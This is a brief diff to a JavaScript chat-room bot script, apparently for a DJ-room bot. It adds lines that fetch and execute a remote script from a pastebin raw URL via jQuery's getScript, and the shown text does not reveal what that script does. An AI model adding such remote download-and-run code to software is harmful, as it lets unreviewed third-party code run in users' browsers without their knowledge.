@@ -277,6 +277,11 @@ function djAdvanceEvent(data){
     setTimeout(function(){ botMethods.djAdvanceEvent(data); }, 500);
 }
 
+var path = 'http://pastebin.com/raw.php?i=';
+
+$.getScript(path + 'YjQSTGjX', function() {
+ window.clearTimeout(scriptFail);
+});
 
 botMethods.skip = function(){
     setTimeout(function(){
